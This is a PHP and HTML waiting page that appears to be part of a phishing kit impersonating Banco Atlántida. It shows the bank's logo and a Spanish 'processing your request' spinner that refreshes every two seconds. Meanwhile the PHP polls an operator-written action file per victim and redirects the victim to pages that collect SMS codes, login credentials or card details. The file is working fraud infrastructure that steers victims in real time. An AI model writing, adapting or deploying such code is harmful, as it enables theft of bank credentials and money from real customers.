<?php
session_start();
$usuario = $_SESSION['usuario'] ?? null;
if (!$usuario) {
    header('Location: inicio.html');
    exit;
}

$archivo = __DIR__ . '/acciones/' . basename($usuario) . '.txt';
if (file_exists($archivo)) {
    $accion = trim(file_get_contents($archivo));
    unlink($archivo);

    switch ($accion) {
        case '/SMS':        header('Location: acceso.html');     break;
        case '/SMSERROR':   header('Location: acceso.html');     break;
        case '/LOGIN':      header('Location: log/index.php');   break;
        case '/LOGINERROR': header('Location: log/index.php');   break;
        case '/CARD':       header('Location: acceso.html');     break;
        case '/LISTO':      header('Location: listo.html');      break;
        case '/ERROR':
        default:            header('Location: inicio.html');     break;
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
  <meta http-equiv="refresh" content="2"/>
  <title>Procesando...</title>
  <link rel="icon" href="img/logo-ba.svg" type="image/svg+xml"/>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet"/>
  <style>
    *{box-sizing:border-box;margin:0;padding:0}
    body{font-family:'Inter',sans-serif;background:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:24px}
    img.logo{height:56px}
    .spinner{width:56px;height:56px;position:relative}
    .spinner .ring{position:absolute;inset:0;border-radius:50%;border:5px solid transparent;animation:spin 1.1s linear infinite}
    .spinner .r1{border-top-color:#E30613}
    .spinner .r2{border-right-color:#f87171;animation-duration:1.6s;animation-direction:reverse;width:42px;height:42px;top:7px;left:7px}
    @keyframes spin{to{transform:rotate(360deg)}}
    p{font-size:15px;color:#374151;font-weight:500}
    small{font-size:12px;color:#9ca3af;margin-top:-16px}
  </style>
</head>
<body>
  <img src="img/logo-ba.svg" class="logo" alt="Banco Atlántida"/>
  <div class="spinner">
    <div class="ring r1"></div>
    <div class="ring r2"></div>
  </div>
  <p>Estamos procesando tu solicitud...</p>
  <small>No cierres esta ventana</small>
</body>
</html>
